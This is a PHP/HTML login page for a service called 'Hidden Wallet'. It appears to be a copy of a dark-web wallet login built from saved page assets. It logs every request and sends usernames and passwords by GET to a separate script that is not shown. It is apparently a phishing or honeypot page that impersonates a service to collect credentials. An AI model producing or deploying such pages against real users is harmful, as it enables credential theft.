<?php
	require("logger.php");
	logRequest(3);
?>
<!DOCTYPE html>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"><meta charset="UTF-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport"><title>Hidden Wallet</title><link href="http://d46a7ehxj6d6f2cf4hi3b424uzywno24c7qtnvdvwsah5qpogewoeqid.onion/img/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="HiddenWalletLogin_files/semantic.css" media="screen" rel="stylesheet" type="text/css"><link href="HiddenWalletLogin_files/style.css" media="screen" rel="stylesheet" type="text/css"><link href="HiddenWalletLogin_files/checkbox.css" media="screen" rel="stylesheet" type="text/css"><link href="HiddenWalletLogin_files/form.css" media="screen" rel="stylesheet" type="text/css"><script src="HiddenWalletLogin_files/jquery-3.js"></script><script src="HiddenWalletLogin_files/checkbox.js"></script><script src="HiddenWalletLogin_files/form.js"></script><script src="HiddenWalletLogin_files/app.js"></script></head><body><div class="pusher"><div class="ui inverted vertical center aligned segment"><div class="ui container"><div class="ui large secondary inverted pointing menu"><a class="active item" href="index.php">Home</a><a class="item" href="FAQ.php">FAQ</a><a class="item" href="Terms.php">Terms</a><div class="right item"><a class="ui inverted button" href="Login.php">Log in</a><a class="ui inverted button" href="Register.php">Register</a></div></div></div></div></div><div class="ui vertical stripe segment"><div class="ui middle aligned centered stackable grid container"><h1>Log into your Hidden Wallet account</h1><br></div><div class="ui middle aligned centered stackable grid container"><form action="ProcessLogin.php" class="ui form" method="GET"><div class="field"><label>Username</label><input name="user" placeholder="Username" required="" type="text"></div><div class="field"><label>Password</label><input name="pass" placeholder="Password" required="" type="password"></div><button class="ui button" type="submit">Login</button></form></div></div></body></html>